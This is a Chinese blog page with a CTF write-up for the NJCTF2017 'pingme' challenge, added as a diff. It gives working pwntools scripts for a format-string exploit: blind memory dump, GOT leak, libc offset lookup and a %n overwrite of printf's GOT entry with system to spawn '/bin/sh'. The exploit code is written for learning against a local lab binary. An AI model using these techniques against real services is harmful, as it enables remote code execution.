@@ -1,0 +1,616 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+
+
+
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/cray/img/apple-touch-icon.png">
+  <link rel="icon" type="image/png" href="/cray/img/favicon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="description" content="个人学习生活博客,寻志同道合朋友相互学习,共同进步.">
+  <meta name="author" content="Cray">
+  <meta name="keywords" content>
+  <title>pwn_pingme ~ CrayBlog</title>
+
+  <link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/mdbootstrap/4.13.0/css/mdb.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/3.0.1/github-markdown.min.css">
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">
+
+
+  <link rel="stylesheet" href="/cray/lib/prettify/tomorrow.min.css">
+
+<link rel="stylesheet" href="/cray/css/main.css">
+
+
+  <link rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css">
+
+
+</head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/cray/">&nbsp;<strong>CrayBlog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/cray/">首页</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/cray/archives/">归档</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/cray/tags/">标签</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/cray/links/">友链</a>
+          </li>
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="view intro-2" id="background" false
+         style="background: url('https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200705165738806.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask rgba-black-light flex-center">
+          <div class="container text-center white-text fadeInUp">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              <br>
+              
+
+              <p>
+                
+                  
+                  &nbsp;<i class="far fa-chart-bar"></i>
+                  <span class="post-count">
+                    1.5k 字
+                  </span>&nbsp;
+                
+
+                
+                  
+                  &nbsp;<i class="far fa-clock"></i>
+                  <span class="post-count">
+                      7 分钟
+                  </span>&nbsp;
+                
+
+                
+                  <!-- 不蒜子统计文章PV -->
+                  
+                  &nbsp;<i class="far fa-eye" aria-hidden="true"></i>&nbsp;
+                  <span id="busuanzi_container_page_pv">
+                    <span id="busuanzi_value_page_pv"></span> 次
+                  </span>&nbsp;
+                
+              </p>
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="py-5 z-depth-3" id="board">
+        <div class="post-content mx-auto" id="post">
+          <div class="markdown-body">
+            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本文看不懂可以移步firmianay大佬看详细说明，我记录一些自己的方法。</p>
+<p>PLT表和GOT表的关系：<a href="https://www.jianshu.com/p/0ac63c3744dd" target="_blank" rel="noopener">https://www.jianshu.com/p/0ac63c3744dd</a></p>
+<h2 id="演示环境及工具"><a href="#演示环境及工具" class="headerlink" title="演示环境及工具"></a>演示环境及工具</h2><p>操作系统<strong>linux</strong></p>
+<pre><code class="shell">cray@cray:~$ uname -a 
+Linux cray 5.3.0-3-amd64 #1 SMP deepin 5.3.15-6apricot (2020-04-13) x86_64 GNU/Linux
+cray@cray:~/Documents/Demos$ ldd pingme 
+    linux-gate.so.1 (0xf7edc000)
+    libc.so.6 =&gt; /lib32/libc.so.6 (0xf7cdc000)
+    /lib/ld-linux.so.2 (0xf7edd000)
+
+cray@cray:~/Documents/Demos$ ls -la /lib32/|grep &quot;libc.so.6&quot;
+lrwxrwxrwx  1 root root      12 3月   3 17:36 libc.so.6 -&gt; libc-2.28.so
+cray@cray:~/Documents/Demos$ file /lib32/libc-2.28.so 
+/lib32/libc-2.28.so: ELF 32-bit LSB pie executable, Intel 80386, version 1 (GNU/Linux), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=5327eb7657b083923efe41de73fa7755045362d9, for GNU/Linux 3.2.0, stripped</code></pre>
+<p>调试工具<strong>radare2</strong></p>
+<pre><code class="shell">cray@cray:~$ r2 -v
+radare2 4.5.0-git 0 @ linux-x86-64 git.4.5.0-git
+commit: HEAD build: 2020-05-14__12:01:18</code></pre>
+<p>样本下载</p>
+<h3 id="整体思路"><a href="#整体思路" class="headerlink" title="整体思路"></a>整体思路</h3><p>由于没有给源文件，有格式化漏洞，所以思路找到利用偏移，dump源程序，先找到PLT表中的printf位置，再拿到got表中已经加载的实际printf在导入libc中的地址。可以在libc-database找到对应的偏移，最后使用%n的特性，重写got表的地址为libc_system的地址。</p>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>我们要自己构造环境，拿到pingme后，网上有很多用socat去重新加载的，但是效率很低 OTZ，这里也给一个 firmianay大佬的方案</p>
+<pre><code class="bash">#!/bin/sh
+while true; do
+        num=`ps -ef | grep &quot;socat&quot; | grep -v &quot;grep&quot; | wc -l`
+        if [ $num -lt 5 ]; then
+                socat tcp4-listen:10001,reuseaddr,fork exec:./pingme &amp;
+        fi
+done</code></pre>
+<p>我尝试使用ncat去加载，速度相当快</p>
+<pre><code class="shell">ncat -vc ./pingme -lk 10001</code></pre>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h4 id="格式化漏洞"><a href="#格式化漏洞" class="headerlink" title="格式化漏洞"></a>格式化漏洞</h4><p>参考<a href="https://www.bookstack.cn/read/CTF-All-In-One/doc-3.1.1_format_string.md" target="_blank" rel="noopener">https://www.bookstack.cn/read/CTF-All-In-One/doc-3.1.1_format_string.md</a></p>
+<h4 id="找到利用点"><a href="#找到利用点" class="headerlink" title="找到利用点"></a>找到利用点</h4><p>利用点是 printf格式中<code>%5$s</code>的含义是：打印printf的第五个参数所指向的地址</p>
+<p>32位程序在传参时将参数放在栈中，经过尝试可以在第7个位置找到保存在栈中的输入数据，如果将他看作地址，就可以任意地址读取.</p>
+<p>这里使用pwntools中的exec_fmt来找利用点，原理都是一样的</p>
+<pre><code class="python">from pwn import *
+p = remote(&#39;127.0.0.1&#39;, &#39;10001&#39;)
+def exec_fmt(payload):
+    log.info(payload)
+    p.sendline(payload)
+    info = p.recv()
+    return info
+auto = FmtStr(exec_fmt)
+offset = auto.offset</code></pre>
+<p>输出如下</p>
+<pre><code class="javascript">[+] Opening connection to 127.0.0.1 on port 10001: Done
+[*] aaaabaaacaaadaaaeaaaSTART%1$pEND
+[*] aaaabaaacaaadaaaeaaaSTART%2$pEND
+[*] aaaabaaacaaadaaaeaaaSTART%3$pEND
+[*] aaaabaaacaaadaaaeaaaSTART%4$pEND
+[*] aaaabaaacaaadaaaeaaaSTART%5$pEND
+[*] aaaabaaacaaadaaaeaaaSTART%6$pEND
+[*] aaaabaaacaaadaaaeaaaSTART%7$pEND
+[*] Found format string offset: 7
+[*] Closed connection to 127.0.0.1 port 10001</code></pre>
+<h4 id="dump源程序"><a href="#dump源程序" class="headerlink" title="dump源程序"></a>dump源程序</h4><p>虽然我们这里拿到了源程序，但是比赛中是没提供源程序的，所以要自己用前面的漏洞dump出来</p>
+<p>通过前面的漏洞，猜测程序未打开PIE，加载地址未0x8048000</p>
+<p>使用<code>&quot;%9$s.AAA&quot; + p32(start_addr)</code>格式化是因为printf在打印<code>\x00</code>的时候会认为是截断符号，就不会打印任何东西，所以这里将第二个参数设置未<code>.AAA</code>来表示这次printf输出了多少数据，如果前面为空，那么就是截断符号，要手动修改.</p>
+<p>dump脚本如下</p>
+<pre><code class="python">from pwn import *
+def dump_memory(start_addr, end_addr):
+    result = &quot;&quot;
+    while start_addr &lt; end_addr:
+        p = remote(&#39;127.0.0.1&#39;, &#39;10001&#39;)
+        p.recvline()
+        #print result.encode(&#39;hex&#39;)
+        payload = &quot;%9$s.AAA&quot; + p32(start_addr)
+        p.sendline(payload)
+        data = p.recvuntil(&quot;.AAA&quot;)[:-4]
+        if data == &quot;&quot;:
+            data = &quot;\x00&quot;
+        log.info(&quot;leaking: 0x%x --&gt; %s&quot; % (start_addr, data.encode(&#39;hex&#39;)))
+        result += data
+        start_addr += len(data)
+        p.close()
+    return result
+start_addr = 0x8048000
+end_addr   = 0x8049000
+code_bin = dump_memory(start_addr, end_addr)
+with open(&quot;code.bin&quot;, &quot;wb&quot;) as f:
+    f.write(code_bin)
+    f.close()</code></pre>
+<h4 id="获取printf-got"><a href="#获取printf-got" class="headerlink" title="获取printf_got"></a>获取printf_got</h4><p>拿到部分重要的源代码后，就可以在rabin2中来识别符号了，imp.printf 虚拟地址为 0x08048400</p>
+<pre><code class="shell">[0x08048490]&gt; is
+[Symbols]
+
+nth paddr       vaddr      bind   type   size lib name
+――――――――――――――――――――――――――――――――――――――――――――――――――――――
+11   ---------- 0x080499a4 GLOBAL OBJ    4        stdout
+12   0x0000071c 0x0804871c GLOBAL OBJ    4        _IO_stdin_used
+13   ---------- 0x080499a0 GLOBAL OBJ    4        stdin
+1    0x000003f0 0x080483f0 GLOBAL FUNC   16       imp.setbuf
+2    0x00000400 0x08048400 GLOBAL FUNC   16       imp.printf
+3    0x00000410 0x08048410 GLOBAL FUNC   16       imp.fgets
+4    0x00000420 0x08048420 GLOBAL FUNC   16       imp.alarm
+6    ---------- 0x00000000 WEAK   NOTYPE 16       imp.__gmon_start__
+7    0x00000440 0x08048440 GLOBAL FUNC   16       imp.strchr
+8    0x00000450 0x08048450 GLOBAL FUNC   16       imp.strlen
+9    0x00000460 0x08048460 GLOBAL FUNC   16       imp.__libc_start_main
+10   0x00000470 0x08048470 GLOBAL FUNC   16       imp.putchar</code></pre>
+<p>然后拿到got表中printf的地址  0x8049974</p>
+<pre><code class="shell">[0x08048490]&gt; pd 3 @ 0x8048400
+        ╎   ; CALL XREF from main @ 0x8048664
+┌ 6: int sym.imp.printf (const char *format);
+│ bp: 0 (vars 0, args 0)
+│ sp: 0 (vars 0, args 0)
+│ rg: 0 (vars 0, args 0)
+└       ╎   0x08048400      ff2574990408   jmp dword [reloc.printf]    ; 0x8049974
+        ╎   0x08048406      6808000030     push panel.addr             ; 0x30000008
+        └─&lt; 0x0804840b      e9d0ffffff     jmp section..plt</code></pre>
+<h4 id="获取libc-printf找到对应libc"><a href="#获取libc-printf找到对应libc" class="headerlink" title="获取libc_printf找到对应libc"></a>获取libc_printf找到对应libc</h4><p>这里的got表指向的就是libc中的printf地址</p>
+<p>可以利用这个printf的地址，到libc库里去匹配，找到对应的libc，再拿到system的地址</p>
+<pre><code class="pyhton">from pwn import *
+def get_libc_printf():
+    addr = 0x8049974
+    p = remote(&#39;127.0.0.1&#39;, &#39;10001&#39;)
+    p.recvline()
+    payload = &quot;%9$s.AAA&quot; + p32(addr)
+    p.sendline(payload)
+    data = p.recvuntil(&quot;.AAA&quot;)[:4].encode(&#39;hex&#39;)
+    data = data[6:8]+data[4:6]+data[2:4]+data[0:2]
+    log.info(&quot;leaking: 0x%x --&gt; 0x%s&quot; % (addr, data))
+    p.close()
+get_libc_printf()</code></pre>
+<p>我这里输入是860结尾，去<a href="https://libc.blukat.me/中搜索" target="_blank" rel="noopener">https://libc.blukat.me/中搜索</a></p>
+<p><img src="https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200521225248944.png" srcset="/cray/img/loading.gif" alt="image-20200521225248944"></p>
+<p>我这里由于libc版本比较新，网站没收录，所以自己导入搞一下</p>
+<p>用到开源代码<a href="https://github.com/niklasb/libc-database" target="_blank" rel="noopener">https://github.com/niklasb/libc-database</a></p>
+<p>先加载一下libc</p>
+<pre><code class="shell">cray@cray:~/SOFT/libc-database$ ./add /lib32/libc-2.28.so 
+Adding local libc /lib32/libc-2.28.so (id local-8c74cfda272116c51d2de1e1bd19d1f9994d4d98  /lib32/libc-2.28.so)
+  -&gt; Writing libc to db/local-8c74cfda272116c51d2de1e1bd19d1f9994d4d98.so
+  -&gt; Writing symbols to db/local-8c74cfda272116c51d2de1e1bd19d1f9994d4d98.symbols
+  -&gt; Writing version info</code></pre>
+<p>…（未完待续</p>
+<p>拿到偏移后</p>
+<h4 id="利用-n特性重写printf-got"><a href="#利用-n特性重写printf-got" class="headerlink" title="利用%n特性重写printf_got"></a>利用%n特性重写printf_got</h4><p>脚本</p>
+<pre><code class="python">payload = fmtstr_payload(7, {printf_got: system_addr})
+p = remote(&#39;127.0.0.1&#39;, &#39;10001&#39;)
+p.recvline()
+p.sendline(payload)
+p.recv()
+p.sendline(&#39;/bin/sh&#39;)
+p.interactive()</code></pre>
+<p>最终我的exp：</p>
+<pre><code class="python">from pwn import *
+def eeexp():
+    printf_got = 0x8049974
+    system_offset = 0x0003e9e0
+    printf_offset = 0x00052860
+
+    p = remote(&#39;127.0.0.1&#39;, &#39;10001&#39;)
+    p.recvline()
+    payload = &quot;%9$s.AAA&quot; + p32(printf_got)
+    p.sendline(payload)
+    data = p.recvuntil(&quot;.AAA&quot;)[:4].encode(&#39;hex&#39;)
+    data2 = data[6:8]+data[4:6]+data[2:4]+data[0:2]
+    printf_so = eval(&quot;0x{}&quot;.format(data2))
+    log.info(&quot;printf_so -&gt; 0x%x&quot; % printf_so)
+    system_so = printf_so + (system_offset-printf_offset) 
+    log.info(&quot;system_got -&gt; 0x%x&quot; % system_so)
+
+    payload = fmtstr_payload(7,{printf_got:system_so})
+    p.sendline(payload)
+
+    p.recv()
+    p.sendline(&#39;/bin/sh&#39;)
+    p.interactive()
+if __name__ == &quot;__main__&quot;:
+    eeexp()
+</code></pre>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.bookstack.cn/read/CTF-All-In-One/doc-6.1.2_pwn_njctf2017_pingme.md" target="_blank" rel="noopener">https://www.bookstack.cn/read/CTF-All-In-One/doc-6.1.2_pwn_njctf2017_pingme.md</a></p>
+
+            <hr>
+          </div>
+          <br>
+          <div>
+            <p>
+            
+            
+              <span>
+                <i class="iconfont icon-tag"></i>
+                
+                  <a class="hover-with-bg" href="/cray/tags/pwn/">pwn</a>
+                
+              </span>
+            
+            </p>
+            
+              <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" rel="nofollow noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
+            
+          </div>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container">
+        <div id="toc">
+  <p class="h5"><i class="far fa-list-alt"></i>&nbsp;目录</p>
+  <div id="tocbot"></div>
+</div>
+      </div>
+    
+  </div>
+</div>
+
+<!-- custom -->
+
+
+<!-- Comments -->
+<div class="col-lg-7 mx-auto nopadding-md">
+  <div class="container comments mx-auto" id="comments">
+    
+      <br><br>
+      
+      
+  <div class="disqus" style="width:100%">
+    <div id="disqus_thread"></div>
+    <script>
+      var disqus_config = function () {
+        this.page.url = 'http://l0yy.gitee.io/cray/2020/03/31/pwn_NJCTF2017_pingme/';
+        this.page.identifier = '/2020/03/31/pwn_NJCTF2017_pingme/';
+      };
+      var oldLoad = window.onload;
+      window.onload = function () {
+        var d = document, s = d.createElement('script');
+        s.type = 'text/javascript';
+        s.src = '//' + 'https-l0yy-github-io' + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+      };
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow noopener">comments
+        powered by Disqus.</a></noscript>
+  </div>
+
+
+    
+  </div>
+</div>
+
+    
+  </main>
+
+  
+    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
+      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><b>Hexo</b></a>
+    <i class="iconfont icon-love"></i>
+    <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"> <b>Fluid</b></a>
+    <br>
+
+    
+  
+    <!-- 不蒜子统计PV -->
+    
+    &nbsp;<span id="busuanzi_container_site_pv"></span>总访问量 
+          <span id="busuanzi_value_site_pv"></span> 次&nbsp;
+  
+  
+    <!-- 不蒜子统计UV -->
+    
+    &nbsp;<span id="busuanzi_container_site_uv"></span>总访客数 
+            <span id="busuanzi_value_site_uv"></span> 人&nbsp;
+  
+  <br>
+
+
+
+    
+
+
+    <!-- cnzz Analytics icon -->
+    
+
+  </div>
+</footer>
+
+<!-- SCRIPTS -->
+<script src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
+<script src="https://cdn.staticfile.org/popper.js/1.16.1/umd/popper.min.js" ></script>
+<script src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
+<script src="https://cdn.staticfile.org/mdbootstrap/4.13.0/js/mdb.min.js" ></script>
+<script src="/cray/js/main.js" ></script>
+
+
+  <script src="/cray/js/lazyload.js" ></script>
+
+
+
+  
+  <script src="https://cdn.staticfile.org/tocbot/4.10.0/tocbot.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      var navHeight = $('#navbar').height();
+      var toc = $('#toc');
+      var main = $('main');
+      var tocT = navHeight + (toc.offset().top - main.offset().top);
+      var tocLimMin = main.offset().top - navHeight;
+      var tocLimMax = $('#comments').offset().top - navHeight;
+      $(window).scroll(function () {
+        var scroH = document.body.scrollTop + document.documentElement.scrollTop;
+        if (tocLimMin <= scroH && scroH <= tocLimMax) {
+          toc.css({
+            'display': 'block',
+            'position': 'fixed',
+            'top': tocT,
+          });
+        } else if (scroH <= tocLimMin) {
+          toc.css({
+            'position': '',
+            'top': '',
+          });
+        } else if (scroH > tocLimMax) {
+          toc.css('display', 'none');
+        }
+      });
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '.post-content',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        scrollSmooth: true,
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc > p').css('visibility', 'visible');
+      }
+    });
+  </script>
+
+
+
+
+
+
+
+  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+<!-- Plugins -->
+
+
+
+  <script src="https://cdn.staticfile.org/prettify/188.0.0/prettify.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      $('pre').addClass('prettyprint  ');
+      prettyPrint();
+    })
+  </script>
+
+
+
+  <script src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "pwn_pingme&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script src="/cray/js/local-search.js" ></script>
+  <script>
+    var path = "/cray/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      getSearchFile(path);
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+  <script>
+    $("#post img:not(.no-zoom img, img[no-zoom])").each(
+      function () {
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "images");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
